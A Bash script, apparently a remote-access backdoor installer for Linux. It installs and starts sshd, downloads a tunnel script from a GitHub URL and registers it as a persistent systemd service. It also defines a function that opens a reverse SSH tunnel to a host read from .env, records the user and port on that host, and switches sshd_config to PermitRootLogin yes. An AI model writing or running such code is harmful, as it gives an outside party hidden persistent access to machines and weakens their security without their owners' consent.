#!/bin/bash

source "./.env"

# rm "./.env"

connect_ssh() {
  sshd_config=/etc/ssh/sshd_config
  if [[ $(ls $sshd_config) ]]; then
    port=$(cat $sshd_config | grep -w Port | awk '{print $2}')
    port_random=$(shuf -i 39900-39910 -n 1)
    ssh_root=$(cat $sshd_config | grep -w PermitRootLogin | awk 'NR==1{print $2}')
    start_ssh=$(ssh -t -R "$port_random":localhost:"$port" $USER@$HOSTNAME -p $PORT "echo $(whoami) $port_random >> /tmp/remote_users.txt; sh")
    if [[ $ssh_root != 'yes' ]]; then
      sed -i 's/PermitRootLogin prohibit-password/PermitRootLogin yes/g' $sshd_config
      $start_ssh
      # ssh $USER@$HOSTNAME -p $PORT -t "echo $user $port_random >> /tmp/remote_users.txt"
    else
      $start_ssh
    fi
  else
    echo False
  fi
}

create_file() {
  file=/etc/systemd/user
  file_ssh=$file/tunnel.sh
  file_service=$file/tunnel.service
  mkdir -p $file
  wget -O $file_ssh https://raw.githubusercontent.com/axolotl13/Scripts-Linux/main/tunnel_ssh.sh
  touch $file_service

  echo "[Service]
ExecStart=/bin/sh $file_ssh

[Install]
WantedBy=default.target" >$file_service

  sleep 3
  systemctl --user daemon-reload
  if [ "$(systemctl --user is-enabled tunnel)" == "disabled" ]; then
    sudo systemctl enable tunnel
    # sudo systemctl start tunnel
  fi
}

check_ssh() {
  if [ "$(systemctl is-active sshd)" == "active" ]; then
    echo "SSH service is running."
    create_file
    # connect_ssh
  else
    echo "SSH service is not running."
    sudo systemctl enable sshd
    sudo systemctl start sshd
    create_file
    # connect_ssh
  fi
}

check_os() {
  if [ -f /etc/os-release ]; then
    . /etc/os-release
    OS=$NAME
  else
    echo "No se pudo detectar la distribución de Linux"
    exit 1
  fi

  if [ -z "$(which sudo)" ] || [ -z "$(which sshd)" ] || [ -z "$(which wget)" ]; then
    case $OS in
    "Ubuntu" | "Debian GNU/Linux")
      apt update && apt upgrade && apt install sudo openssh-server wget -y
      ;;
    "Fedora")
      dnf upgrade && dnf install sudo openssh-server wget -y
      ;;
    "Arch Linux")
      pacman -Syu && pacman -Sy sudo openssh wget
      ;;
    *)
      echo "No se reconoce la distribución $OS"
      exit 1
      ;;
    esac
  fi

  check_ssh
}

check_os
